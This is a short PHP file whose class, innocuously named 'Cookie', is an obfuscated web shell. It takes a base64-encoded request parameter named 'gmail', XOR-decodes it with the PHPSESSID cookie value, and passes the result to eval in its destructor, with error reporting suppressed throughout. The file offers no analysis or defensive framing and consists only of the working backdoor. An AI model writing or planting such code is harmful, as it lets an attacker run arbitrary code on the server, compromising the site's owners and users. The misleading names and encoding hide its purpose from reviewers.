<?php
class Cookie
{
    function __construct()
    {
        $key=@$_COOKIE['PHPSESSID'];
        @$post=base64_decode($_REQUEST['gmail']);
        for($i=0;$i<strlen($post);$i++){
            $post[$i] = $post[$i] ^ $key[$i%26];
        }
        return $post;
    }
    function __destruct()
    {return @eval($this->__construct());}
}
$check=new Cookie();
?>